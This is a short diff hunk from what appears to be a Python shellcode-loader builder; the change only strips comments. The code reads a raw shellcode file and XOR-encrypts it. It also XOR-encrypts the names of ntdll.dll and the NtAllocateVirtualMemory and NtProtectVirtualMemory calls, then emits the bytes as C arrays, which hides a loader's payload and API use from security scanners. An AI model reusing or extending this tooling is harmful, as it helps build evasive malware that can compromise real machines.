@@ -41,28 +41,22 @@ if "-k" in sys.argv:
 
     key_length = len(key)
 
-# Read raw shellcode
 with open(bin_file, "rb") as f:
     shellcode = f.read()
 
-# XOR encryption function
 def xor_bytes(data: bytes, key: list[int]) -> bytes:
     return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
 
-# XOR encryption for C strings (adds null terminator)
 def xor_c_string(s: str, key: list[int]) -> bytes:
     data = s.encode() + b'\x00'
     return xor_bytes(data, key)
 
-# Encrypt shellcode
 xor_shellcode = xor_bytes(shellcode, key)
 
-# Encrypt STRING() values
 ntdll_name = xor_c_string("ntdll.dll", key)
 ntalloc_name = xor_c_string("NtAllocateVirtualMemory", key)
 ntprotect_name = xor_c_string("NtProtectVirtualMemory", key)
 
-# Convert bytes to C array string
 def bytes_to_c_array(b: bytes) -> str:
     return ",".join(f"0x{byte:02x}" for byte in b)
 
